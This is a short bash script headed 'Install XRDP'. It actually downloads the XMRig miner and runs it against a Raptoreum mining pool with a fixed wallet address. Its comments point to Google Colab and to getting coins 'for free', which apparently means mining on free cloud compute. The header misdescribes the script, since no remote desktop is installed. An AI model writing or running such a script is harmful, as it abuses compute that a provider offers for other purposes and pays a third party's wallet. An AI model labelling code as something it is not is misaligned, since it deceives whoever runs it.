#! /bin/bash
# Install XRDP
# Before get rtm coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R rtm
 
wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-bionic-x64.tar.gz
tar -xf xmrig-6.18.0-bionic-x64.tar.gz
cd xmrig-6.18.0
./xmrig -o asia.flockpool.com:4444 -u RQhzMBStnUcVCUe1r8m5Rc5hP5zp2fYJc1 -k -a gr --tls --rig-id
